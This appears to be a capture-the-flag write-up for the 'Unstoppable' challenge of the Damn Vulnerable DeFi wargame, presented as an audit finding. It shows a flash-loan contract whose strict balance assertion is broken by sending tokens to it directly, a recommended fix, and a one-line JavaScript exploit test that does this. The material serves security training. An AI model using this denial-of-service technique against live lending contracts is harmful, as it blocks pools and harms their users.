# Damn Vulnerable DeFi

Damn Vulnerable DeFi is the wargame to learn offensive security of DeFi smart contracts.

Throughout numerous challenges you will build the skills to become a bug hunter or security auditor in the space.

https://www.damnvulnerabledefi.xyz/

# Introduction

Unstoppable is the first challenge in the Damn Vulnerable DeFi series.

Challenge description: 
There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
If only there was a way to attack and stop the pool from offering flash loans ...
You start with 100 DVT tokens in balance.

Challenge goal:
Make it so that it is no longer possible to execute flash loans.

# Findings 

## Critical Risk
### Incorrect equality in assert statement

**Context:** [`UnstoppableLender.sol#L40`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/contracts/unstoppable/UnstoppableLender.sol)

**Description:**
UnstoppableLender contract uses depositTokens function to fund the pool and updates poolBalance variable accordingly. However one can send tokens to the contract without using depositTokens function causing poolBalance to be incorrect which leads to assertion in line40 being always false.

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
    require(borrowAmount > 0, "Must borrow at least one token");

    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

    // Ensured by the protocol via the `depositTokens` function
    assert(poolBalance == balanceBefore);
        
    damnValuableToken.transfer(msg.sender, borrowAmount);
        
    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```
**Recommendation:**
poolBalance has no good use in the contract and should be removed along with every line using it. one should use token.balanceOf(address(this)) if he wants to know how much of a token is in the contract.

```diff
+ 
- assert(poolBalance == balanceBefore);
- uint256 public poolBalance;
- poolBalance = poolBalance + amount;
```

# How To Solve The Challenge
send DamnValuableTokens to UnstoppableLender contract without using depositTokens function.

**Context:** [`unstoppable.challenge.js#L41-L43`](https://github.com/tahos81/damn-vulnerable-defi-solutions/blob/master/test/unstoppable/unstoppable.challenge.js)

```javascript
it('Exploit', async function () {
    await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
});
```